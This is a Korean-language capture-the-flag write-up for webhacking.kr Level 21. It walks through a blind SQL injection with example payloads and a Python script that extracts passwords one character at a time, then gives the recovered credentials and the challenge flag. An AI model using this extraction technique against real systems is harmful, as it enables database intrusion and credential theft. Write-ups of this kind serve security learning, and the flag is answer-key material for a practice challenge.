---
title: "[Web.kr]Level 21"
tags: [wargame, webhacking.kr(old), writeup]
author: eli_ez3r
key: 20180903
modify_date: 2018-09-03
article_header:
  type: cover
  image:
    src: 
---

<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 21/image-20180726144412211.png" width="400px">

<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 21/image-20180726144840924.png" width="400px">

Blind SQL Injection이라고 되어 있다. 주소창을 보니 no, id, pw값을 입력받고 있다.

no에 숫자들을 입력해 보니 True라고 나오는 숫자는 1과 2뿐이다. 따라서 id값은 1과 2이다.

이제 각 id에 맞는 id와 pw를 찾아내야 한다.

<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 21/image-20180726145056313.png" width="300px">

<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 21/image-20180726145219268.png" width="300px">

`1 and length(id)=5` 를 이용하여 id의 길이가 5인 것과, pw의 길이가 5인 것을 알아 냈다. 똑같은 방법으로 no가 2인 id와 pw의 길이도 알아내면 id는 5, pw는 19의 길이를 가지고 있다.

|  no  |  id   |   pw   |
| :--: | :---: | :----: |
|  1   | ? (5) | ? (5)  |
|  2   | ? (5) | ? (19) |



이제 아이디를 찾아보자. 보통 5의 길이를 가진 id는 'admin'이 있다. 이를 예측해보고 no=1의 id를 substr()를 이용하여 찾아보자.

`1 and ascii(substr(id, 1, 1))=97` 

위 명령어는 no가 1이고, id의 첫번째 인덱스에서 1byte가 ascii코드로 97('a')인지 확인하는 명령어이다.

<img src="http://eliez3r.synology.me/assets/img/writeup/webkr/Level 21/image-20180726145852871.png" width="300px">

생각처럼 no=1의 id는 'admin'이 아닌것 같다. 하지만 같은 방식으로 no=2의 id를 비교해보니 'admin'이 맞았다.

|  no  |    id     |   pw   |
| :--: | :-------: | :----: |
|  1   |   ? (5)   | ? (5)  |
|  2   | admin (5) | ? (19) |

이렇게 하나하나씩 다 비교해 보는 것은 매우 힘든일이다. 한글자 마다 ascii코드 33부터 136까지 다 비교해봐야 하기 때문이다. 

```python
import requests

url = 'http://webhacking.kr/challenge/bonus/bonus-1/index.php?'
cookie={'PHPSESSID':'b82bba458acf3b6fd70126be82c02e2f'}
pw = ''

# no=1
for i in range(1, 6):
    for j in range(33, 137):
        query = "no=1 and ascii(substr(pw,"+str(i)+" ,1))="+str(j)
        payload = url+query
        print("Password Parsing : "+pw+chr(j))
        res = requests.get(payload, cookies=cookie)
        if((res.text).find("True")>0):
            pw += chr(j)
            print("Find PW : "+pw)
            break

print("[+]Finish Password Parsing...")
print("Password : "+pw)
```

힘든건 컴퓨터한테 시키면 된다.

|  no  |    id     |            pw            |
| :--: | :-------: | :----------------------: |
|  1   |   ? (5)   |        guest (5)         |
|  2   | admin (5) | blindsqlinjectionkk (19) |

no=1의 pw를 찾다보니 비밀번호 한자리씩 파싱하는데 시간이 1-2초씩 소비하였다. 5글자 알아내는대도 5분정도 걸린것 같다. no=2의 pw는 소문자 일것으로 추측하고 경우의 수를 줄여 파싱을 진행하였다. (시간은 금이니까 😏)

##### **flag = blindsqlinjectionkk**

